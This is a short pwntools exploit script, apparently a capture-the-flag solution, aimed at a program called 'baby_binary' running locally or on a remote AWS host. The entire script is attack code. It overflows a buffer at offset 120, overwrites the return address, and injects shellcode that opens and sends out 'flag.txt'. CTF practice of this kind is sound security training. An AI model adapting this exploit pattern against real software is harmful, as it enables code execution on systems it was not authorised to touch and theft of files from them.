#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("baby_binary")
if args.REMOTE:
    p = remote('ec2-3-1-204-6.ap-southeast-1.compute.amazonaws.com', 64852)
else:
    p = elf.process()

p.sendline(fit({
    120: 0x0000000000418d92,
    128: asm(shellcraft.open("flag.txt", 0, 0)) + asm(shellcraft.sendfile(1, 3, 0, 100))
}))

p.interactive()
